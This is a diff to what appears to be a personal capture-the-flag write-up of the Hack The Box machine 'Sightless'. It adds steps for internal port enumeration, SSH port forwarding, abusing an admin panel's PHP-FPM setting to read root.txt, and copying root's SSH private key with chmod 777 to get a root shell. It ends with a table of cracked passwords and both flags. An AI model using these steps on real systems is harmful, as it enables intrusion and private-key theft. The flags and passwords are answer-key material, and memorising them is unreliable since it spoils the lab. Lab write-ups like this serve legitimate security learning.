@@ -90,18 +90,59 @@ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt inputJohn
 ![[Pasted image 20241003001456.png]]
 Connect with ssh and michael user and find the first flag
 ![[Pasted image 20241003001710.png]]
-Now it possible intercat with docker
+## 4 Internal Port Scan
+with netstat i enumerate the open port on the system 
+```bash
+netstat -tnlp
+```
+![[Pasted image 20241006145840.png]]
 
+Now forwarded the 8080 traffic on my machine using ssh
+```bash
+ ssh -L 8080:127.0.0.1:8080 -L 3306:127.0.0.1:3306 -L 47003:127.0.0.1:47003 -L 36613:127.0.0.1:36613 -L 41463:127.0.0.1:41463 -L 33060:127.0.0.1:33060 -L 3000:127.0.0.1:3000 michael@sightless.htb
+```
+![[Pasted image 20241006150528.png]]
+
+Google Debugger è uno strumento potente per il debugging delle applicazioni, soprattutto in ambienti di produzione, perché consente di catturare lo stato dell'applicazione senza interromperne il funzionamento. Tuttavia, se non configurato correttamente, può essere sfruttato come vulnerabilità, poiché un attaccante potrebbe ottenere accesso non autorizzato a informazioni sensibili dell'applicazione.
+
+![[Pasted image 20241006160147.png]]
+![[Pasted image 20241006161448.png]]
+
+![[Pasted image 20241006161454.png]]
+### 4.1 Capture the flag 
+Copy the root.txt in tmp directory
+![[Pasted image 20241007212717.png]]
+Now navigate on the setting > PHP-FPM and stop and start the Enable php-fpm
+
+![[Pasted image 20241007212805.png]]
+
+now set permission to read the flag with chmod 777
+![[Pasted image 20241007213613.png]]
+
+
+![[Pasted image 20241007213548.png]]
+
+
+### 4.2 Spawn root privilege shell
+cp from /root/.ssh/id_rsa to /tmp/id_rsa and set permission and execute ssh
+```bash
+cp /root/.ssh/id_rsa /tmp/id_rsa
+chmod 777 /tmp/id_rsa
+ssh -i /tmp/id_rsa root@10.10.11.32
+```
+
+![[Pasted image 20241007222925.png]]
 ## Loot
 
 | User    | Pwd              |
 | ------- | ---------------- |
 | root    | blindside        |
 | michael | insaneclownposse |
+| admin   | ForlorfroxAdmin  |
 
 
 | User | flag                             |
 | ---- | -------------------------------- |
 | user | 501dc92dbd0ba17555f2ce191802ba82 |
-| root |                                  |
+| root | 67a8a1c6d3ecc49a9f11620ea6cff75c |
 
